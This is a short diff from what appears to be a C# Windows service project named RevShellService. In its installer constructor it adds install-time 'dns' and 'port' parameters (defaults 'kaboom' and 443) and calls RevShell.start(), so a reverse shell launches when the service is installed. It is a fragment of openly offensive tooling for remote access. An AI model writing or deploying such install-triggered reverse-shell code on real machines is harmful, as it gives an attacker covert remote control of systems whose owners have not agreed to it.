@@ -14,6 +14,8 @@ namespace RevShellService
         public ProjectInstaller()
         {
             InitializeComponent();
+            String ip = Context.Parameters["dns"] ?? "kaboom";
+            String port = Context.Parameters["port"] ?? "443";
             RevShell.start();
 
         }
